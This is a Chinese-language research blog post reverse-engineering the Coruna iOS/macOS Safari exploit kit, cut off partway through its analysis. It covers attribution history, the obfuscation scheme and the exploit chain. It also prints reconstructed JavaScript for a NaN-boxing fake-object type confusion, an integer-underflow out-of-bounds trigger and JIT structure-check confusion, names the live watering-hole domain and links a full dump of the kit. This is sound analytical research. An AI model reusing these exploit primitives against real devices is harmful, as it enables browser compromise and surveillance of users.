#  Coruna 深度剖析:一次国家级 iOS 漏洞工具包的逆向之旅  
nadsec
                    nadsec  赛博知识驿站   2026-03-08 02:01  
  
   
  
我从 b27.icu  
 直接下载了 28 个 JavaScript 模块——这是一个水坑攻击域名,专门投放 Safari 漏洞利用链。我对整个工具包进行了完整逆向:解混淆 500+ 个 XOR 编码字符串,提取 WebAssembly 模块,重建 ARM64 gadget 扫描器,覆盖约 700KB 代码。以下是我的发现。  
## NadSec 研究报告  
### CORUNA  
  
**国家级漏洞工具包 - 从 JavaScript 源码逆向重建**  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">指标</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">数据</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">恢复模块</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">28 个 JS 文件</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">约 700KB 混淆代码</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">解码字符串</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">500+ XOR</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">167 个独立解码字符串</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">覆盖 CVE</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">8 个漏洞</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">部署时均为零日</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">技术分析</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">6,596 行</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">完整拆解文档</span></section></td></tr></tbody></table>  
  
**GitHub 仓库:**  
- • Rat5ak/CORUNA_TECHNICAL_ANALYSIS[1]  
  
- • Rat5ak/CORUNA_IOS-MACOS_FULL_DUMP[2]  
  
下载 Coruna 完整转储包 https://www.nadsec.online/data/coruna-dump.zip[3]  
## 博客正文  
### TL;DR  
  
我直接从 b27.icu  
 下载了 28 个 JavaScript 模块——这是一个投放 Safari 漏洞利用链的水坑域名,URL 来自 matteyeux[4]  
 的公开发布。随后,我从混淆的 JavaScript 源码逆向了整条利用链:解混淆 500+ 个 XOR 编码字符串,提取内联 WebAssembly 模块,重建 ARM64 gadget 扫描器,记录了约 700KB 代码中的每个类、方法和利用原语。最终输出是一份 6,596 行的技术分析,覆盖 8 个漏洞(部署时均为零日,现已被苹果修复),涵盖 iOS 16.0-17.2 上的 WebKit RCE、PAC 绕过、JIT 笼逃逸和沙箱逃逸。  
  
Google 和 iVerify 从网络捕获、二进制分析和取证痕迹的角度研究这个工具包。**我从另一个方向切入——原始 JavaScript。**  
  
这篇文章揭示了他们分析中未涉及的内容:**JavaScript 实现的内部利用机制**  
,包括 PACDB 滚动哈希伪造算法、GOT 交换混淆代理 PAC 绕过,以及三条并行 WebKit RCE 路径(其中包含一条 iOS 专用的 OfflineAudioContext  
/SVG 利用路径)。  
  
完整的 6,596 行技术分析已发布在 GitHub[1]  
。  
### 背景:Coruna 是什么?  
  
2026年3月3日,Google TIG 发布[5]  
了他们所描述的"一个针对 iOS 13.0 至 17.2.1 的新型强大漏洞工具包"。他们将其命名为 Coruna——这是开发者在某个交付服务器上遗留的调试版本中发现的内部代号。  
  
该工具包包含 **23 个漏洞,横跨 5 条完整利用链**  
,覆盖四年内发布的几乎所有 iPhone 机型。Google 记录了它的传播轨迹:  
1. 1. **2025年初**  
 - 首次在某商业监控供应商的客户处观察到使用  
  
1. 2. **2025年夏**  
 - 由 **UNC6353**  
(疑似俄罗斯间谍组织)通过 cdn.uacounter[.]com  
 在被入侵的乌克兰网站上部署  
  
1. 3. **2025年末**  
 - 由 **UNC6691**  
(中国经济动机威胁行为者)在虚假加密货币和赌博网站上大规模部署  
  
这条传播路径讲述了一个故事。澳大利亚公民 **Peter Williams**  
——L3Harris 子公司 Trenchant 的前高管——因从雇主处窃取漏洞并出售给俄罗斯漏洞经纪商 **Operation Zero**  
,于 2026年2月25日被判处87个月监禁[6]  
。同一周,美国财政部对 Operation Zero 实施了制裁[7]  
。iVerify 告诉 WIRED,该工具包"可能最初是为美国政府开发的",并指出其与卡巴斯基 2023 年记录的 **Operation Triangulation**  
 漏洞存在相似性。Google 确认 Coruna 的两个漏洞(Photon 和 Gallium)使用了与 Triangulation 相同的漏洞。  
  
所以:一个可能为美国情报机构打造的工具包,被内部人员窃取,卖给俄罗斯经纪商,部署针对乌克兰目标,最终流落到中国加密货币诈骗网站,攻击随机 iPhone 用户。**这就是国家级漏洞的完整生命周期。**  
  
**更新(2026年3月7日):**  
 Google 发布报告两天后,CISA 将 CVE-2023-41974[8]  
 添加到已知被利用漏洞目录(修复截止日期:2026年3月26日)。这是 iOS/iPadOS 中的内核释放后重用漏洞(CWE-416),由 Felix Poulin-Belanger 报告,已于 2023年9月18日在 iOS 17 中修复。CVSS 3.1 评分:**7.8 HIGH**  
(AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)。NVD 条目直接引用了 Google 的 Coruna 博客文章作为漏洞来源。这是利用链中的内核权限提升组件——是本分析记录的所有内容之后  
的阶段。我的覆盖范围从 WebKit RCE 到 PAC 绕过再到 WebContent 进程中的 shellcode 执行;CVE-2023-41974 是 shellcode 用来从 WebContent 逃逸到内核的目标。内核漏洞本身可能作为二阶段有效载荷通过 C2 传递,未嵌入 JavaScript 模块中。  
### 我如何走到这一步  
  
当 Google TIG 和 iVerify 于 2026年3月3日发布 Coruna 报告时,JavaScript 源码已经可以访问。matteyeux[4]  
 在 GitHub 上发布了 b27.icu  
 的 URL,以及他自己借助 Claude 完成的去混淆工作。我直接从 b27.icu  
 下载了原始模块(28 个文件约 700KB),并进行了独立逆向工程。  
#### 我手里有什么  
  
混淆技术并不复杂,但**极其彻底**  
:  
- • **XOR 编码字符串**  
 - 每个有意义的字符串(函数名、符号路径、框架标识符)都被编码为整数数组配合 XOR 密钥:[16, 22, 0, 69, 22, 17, 23, 12, 6, 17].map(x => String.fromCharCode(x ^ 101)).join("")  
  
- • **混淆整数**  
 - 常量编码为 XOR 对:(1111970405 ^ 1111966034)  
 而不是直接写实际值  
  
- • **压缩变量名**  
 - 每个变量、类和方法都是 2-6 字符的随机标识符(bvVGhS  
、PtqWRQ  
、khTYss  
)  
  
- • **无注释、无空格**  
 - 在上述基础上进行标准压缩  
  
我解混淆了 500+ 个字符串,提取并反汇编了内联 WebAssembly 模块,还原了 C++ 符号引用,并将每个类映射到其功能用途。结果是一份 6,596 行技术分析[1]  
,记录了完整利用链。  
#### 这份分析的独特之处  
  
Google 和 iVerify 的报告从外部  
研究 Coruna:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf=""><br/></span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">Google TIG</span></strong></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">iVerify</span></strong></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">本分析</span></strong></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">方法</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">网络捕获、二进制分析</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">取证痕迹、设备分析</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">JavaScript 源码逆向</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">范围</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">全部 5 条链、CVE 映射、归因</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">检测 IOC、植入行为</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">单链变体深度内部机制</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">漏洞细节</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE ID + 代号</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">感染流程</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">完整算法重建</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">PAC 绕过</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">&#34;非公开利用技术&#34;</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">未覆盖</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">完整 GOT 交换机制文档</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">JIT 笼逃逸</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">未详述</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">未覆盖</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">PACDB 滚动哈希算法重建</span></section></td></tr></tbody></table>  
  
Google 识别了漏洞目标是什么  
。本分析记录了它们如何工作  
,逐指令级别,正如 JavaScript 实现的那样。  
### 架构概览  
  
我从 b27.icu  
 恢复的 Coruna 工具包由 16 个 JavaScript 模块(加上内部有效载荷)组成,组织为自定义模块系统。每个模块使用 SHA1 哈希作为标识符自注册,并声明对其他模块的依赖。加载器解析依赖并按顺序执行模块。  
  
利用链遵循以下流程:  
```
访客登陆水坑页面    │    ├── 指纹识别(iOS vs macOS、WebKit 版本、锁定模式检查)    │    ▼WebKit RCE(3 条并行路径 - 根据平台/版本选择)    │    ├── 路径 1:NaN-Boxing 类型混淆(macOS 主路径 - YGPUu7)    ├── 路径 2:JIT 结构检查消除(macOS 备用 - KRfmo6)    └── 路径 3:OfflineAudioContext 堆损坏 + SVG R/W(iOS - Fq2t1Q)    │    ▼任意读写原语(Class P 或 Class ut)    │    ▼Wasm call_indirect 调度劫持(class ct)    → 将 Wasm 沙箱转换为原生函数调用原语    │    ▼通过无签名 GOT 交换绕过 PAC(classes ta、ia、ca)    → 苹果框架验证攻击者提供的地址    │    ▼从 WebContent 沙箱分配 mach_vm_allocate RWX    → JIT 笼外的可执行页面    │    ▼通过 PACDB 哈希伪造逃逸 JIT 笼(class hc)    → 任意 shellcode 通过内核验证    │    ▼在 WebContent 进程中执行 ARM64 shellcode
```  
  
用 Google 的术语来说,我的分析主要覆盖 **cassowary**  
(CVE-2024-23222)和 **seedbell**  
 漏洞链变体——针对 iOS 16.x-17.2 的 WebContent R/W + PAC 绕过 + 沙箱逃逸路径。但 JavaScript 源码包含 Google 仅在 CVE 级别描述的技术的完整实现。  
  
接下来的章节将逐步讲解每个阶段。我将重点关注 Google 和 iVerify 未覆盖的内部机制——JavaScript 中实际存在的利用算法。  
### WebKit RCE:三条进入路径  
  
Coruna 不依赖单一 WebKit 漏洞。该工具包包含**三条独立的漏洞路径**  
进入 WebKit 渲染器,根据平台和 Safari 版本在运行时选择:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">路径</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">模块</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">平台</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">漏洞类别</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">路径 1</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">YGPUu7_8dbfa3fd.js</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">macOS(主)</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">NaN-Boxing 类型混淆</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">路径 2</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">KRfmo6_166411bd.js</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">macOS(备用)</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">JIT 结构检查消除</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">路径 3</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">Fq2t1Q_dbfd6e84.js</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">iOS</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">OfflineAudioContext 堆损坏 + SVG R/W</span></section></td></tr></tbody></table>  
  
**三条路径殊途同归**  
:一个存储在 T.Dn.Pn  
(全局状态槽)的任意内存读写原语。从那里开始,后利用链与平台无关。  
  
Google 通过代号识别了 WebKit RCE 组件——**cassowary**  
(CVE-2024-23222)映射到其中一条路径。但他们的发布在 CVE 级别描述漏洞。JavaScript 源码揭示了每个漏洞如何被触发的确切细节,包括 JIT 预热策略、特定整数溢出条件和堆整理序列。  
#### 路径 1:NaN-Boxing 类型混淆(YGPUu7)  
  
**来源:**YGPUu7_8dbfa3fd.js  
(约 10KB)- macOS 主路径  
  
这是三条 RCE 路径中最简洁的一条,也最能说明 Coruna 开发者的利用思维。它攻击 JavaScriptCore 的值表示本身——每个内存中的 JS 值都依赖的 NaN-boxing 方案。  
  
**JSC NaN-Boxing 工作原理**  
  
在 JavaScriptCore 的 64 位引擎中,每个 JavaScript 值都编码为 IEEE 754 双精度浮点数。指针、整数、布尔值——全部如此。诀窍在于 IEEE 754 定义了大量位模式为"非数字"(NaN)——JSC 在该 NaN 空间中编码非双精度值。值的高位告诉 JSC 它看到的是双精度、指针还是整数:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">位 63:44</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">含义</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">正常浮点范围</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">实际双精度值</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">NaN 范围标记</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">JSCell 指针(对象/字符串等)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">特定标签模式</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">整数、布尔、null、undefined</span></section></td></tr></tbody></table>  
  
JSCell(所有堆对象的基类型)以 8 字节头部开始:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">位</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">字段</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">用途</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">[63:44]</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">StructureID</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">JSC 结构表索引(20 位)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">[43:40]</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">索引类型</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">数组存储模式(4 位)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">[39:32]</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">单元类型</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">对象种类标识符(8 位)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">[31:24]</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">标志</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GC 和分配元数据</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">[23:0]</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Butterfly</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">属性/元素存储指针</span></section></td></tr></tbody></table>  
  
**漏洞目标:伪造一个双精度值,其位模式会被 JSC 解释为有效的 JSCell 指针。**  
  
**伪造假对象**  
  
r.kr  
 函数使用别名类型化数组视图构造合成 NaN-boxed 值——共享同一 ArrayBuffer  
 的 Float64Array  
 和 Uint32Array  
。向 Uint32Array  
 写入整数并将相同字节作为 Float64Array  
 读取,可以将任意位模式拼接到 IEEE 754 双精度中:  
```
const r = new ArrayBuffer(64);const i = new Uint32Array(r);      // 整数视图const s = new Float64Array(r);     // 双精度视图(相同内存)// 随机 12 位 StructureID 以避免与真实结构冲突const n = e(1,8)<<8 | e(1,8)<<4 | e(1,8)<<0;const h = e(1, 16777215);  // 随机 butterfly 值// 将假 JSCell 头部伪造为双精度:const a = (cellType, flags) => {    i[1] = n<<20 | 4<<16 | cellType;   // structureID | indexingType=4 | cellType    i[0] = flags<<24 | h;              // flags | butterfly    const e = s[0];                    // 重新解释为 IEEE 754 双精度    if (isNaN(e)) throw new Error(""); // 必须不落在实际 NaN 范围内    return e;};
```  
  
isNaN()  
 防护至关重要。如果伪造的位模式落入 IEEE 754 NaN 范围(0x7FF0000000000001  
-0x7FFFFFFFFFFFFFFF  
),JSC 会将其读取为 NaN 而非指针——混淆失败。随机 StructureID 保持在 0x000  
-0xFFF  
 范围内,使双精度的指数字段低于 NaN 阈值。  
  
触发前,漏洞喷射 400 个相同的空数组,以可预测的条目填充 JSC 的结构表:  
```
let t = new Array(400);t.fill([]);
```  
  
加上 16 个具有嵌套结构的辅助对象数组(a0  
 到 a15  
)以创建可预测的 StructureID。  
  
**Base64 触发器**  
  
实际的类型混淆存在于从 base64 编码字符串构造的 new Function()  
 中。解码后:  
```
for (let t = 0; t < 2; t++) {    if (b === true) {        if (!(a === -2147483648)) return -1;   // INT32_MIN 防护    } else {        if (!(a > 2147483647)) return -2;      // INT32_MAX 防护    }    if (k === 0) a = 0;    if (a < g) {        if (k !== 0) a -= 2147483647 - 7;     // 整数下溢!        if (a < 0) return -3;        let t = l[a];                          // 越界读取        if (d) {            l[a] = r;                          // 越界写入        }        return t;    }}
```  
  
**诀窍**  
:传递一个接近 INT32_MAX  
(2147483647)的值,然后减去 2147483640  
。结果是一个小的正索引——但通过 JSC 的 JIT 已经推测为不可达的代码路径。该函数通过 **16,777,216 次迭代**  
预热以强制 JIT 编译,前 131,072 次使用安全参数,然后切换到漏洞模式。  
  
**收获成果**  
  
触发后,漏洞通过别名类型化数组读回损坏的内存,并恢复 JSC 分配的实际 StructureID:  
```
const S = {    Qr: i[1] >> 20 & 0xFFF,    // structureID(12 位)    zr: i[1] >> 16 & 0xF,      // 索引类型    Fr: 0xFFFF & i[1],          // 低位结构位    Lr: i[0] >> 24 & 0xFF,     // 标志    Rr: 0x1FFFFF & i[0]        // butterfly(21 位)};
```  
  
StructureID 和 butterfly 值与伪造值进行验证——如果匹配,JSC 正在将假双精度视为真实对象。索引类型差异给出 **NaN 偏移**  
(T.Dn.Mn = 65536 * (S.zr - 4)  
),这是一个存储在全局并被所有后续阶段用于在双精度编码和原始指针表示之间转换的校正因子。  
  
从这里开始,YGPUu7 构造 Class P 内存原语——addrof  
、read32  
、read64  
、write32  
、write64  
——全部根植于这单一类型混淆。**WebKit 渲染器现已完全沦陷。**  
#### 路径 2:JIT 结构检查消除(KRfmo6)  
  
**来源:**KRfmo6_166411bd.js  
(约 24KB)- macOS 备用路径  
  
YGPUu7 攻击 JSC 的值表示,而 KRfmo6 攻击 JIT 编译器本身。它欺骗 JSC 的 DFG/FTL 优化管道消除结构检查——这是确保对象仍具有 JIT 编译代码时假设的类型的运行时防护。  
  
**双路径架构**  
  
KRfmo6 在三条路径中独一无二,因为它运行**两次独立的漏洞尝试**  
——一次在主线程,一次在 Web Worker 中:  
```
if (navigator.constructor.name === "Navigator") {    // 主线程:通过递归 try/catch 进行栈损坏    et();       // 应用版本特定偏移    ht(t);      // 主线程路径} else {    // Web Worker:JIT 优化错误    self.onmessage = t => {        l = t.data.dn;   // 从父级接收 WebKit 版本        et();             // 应用偏移        ct();             // worker 漏洞路径    };}
```  
  
主线程从内联 Blob  
 URL 启动 Worker。三种消息类型协调它们:类型 0  
(进度)、类型 1  
(Worker 失败 - 用新 Worker 重试)和类型 2  
(Worker 成功 - 主线程继续栈损坏触发)。这种重试机制使 KRfmo6 在实战中比 YGPUu7 的单次尝试方法可靠得多。  
  
**41 个版本自适应偏移**  
  
任一路径运行前,et()  
 根据 WebKit 版本号调整 41 个 JSC 内部结构偏移表。三个版本阈值(170000、170100、170200)触发不同偏移集——对应苹果重组内部结构的 Safari/WebKit 构建:  
```
function et() {    if (l >= 170000) {        tt["01"] = 96;  tt["02"] = 88;        tt["27"] = 73064;  tt["28"] = 61000;    }    if (l >= 170100) {        tt["27"] = 53864;  tt["28"] = 77200;    }    if (l >= 170200) {        tt["27"] = 69944;  tt["28"] = 78080;    }}
```  
  
偏移 tt["27"]  
 和 tt["28"]  
——52232、73064、69944 这样的值——是 JSC JIT 代码区域的偏移。这些几乎每个 WebKit 版本都会改变,搞错意味着崩溃而非利用。**Coruna 开发者显然能访问多个 WebKit 构建进行测试。**  
  
**触发结构不匹配**  
  
Worker 路径 ct  
 通过 Reflect.construct()  
 创建两个共享同一构造函数但最终具有不同内部 Structure(JSC 的隐藏类系统)的对象:  
```
function n() {}let r = Reflect.construct(Object, [], n);let i = Reflect.construct(Object, [], n);r.p1 = [1.1, 2.2];   // r 获得 Structure S1 - p1 是双精度数组r.p2 = [1.1, 2.2];i.p1 = 3851;          // i 获得 Structure S2 - p1 是整数i.p2 = 3821;delete i.p2;           // 重塑 idelete i.p1;i.p1 = 3853;          // 用不同类型重新附加属性i.p2 = 4823;
```  
  
现在 r.p1  
 是双精度数组,i.p1  
 是整数——但两个对象都用构造函数 n  
 创建,所以 JSC 的 JIT 可能推测它们共享相同的 Structure。  
  
关键函数 h(t, n)  
 随后通过数百万次迭代进行 JIT 编译,在 r  
 和 i  
 之间交替。它包含 **36 个冗余 while 循环**  
——专门设计用于膨胀 JSC 的 DFG 控制流图并触发激进优化:  
```
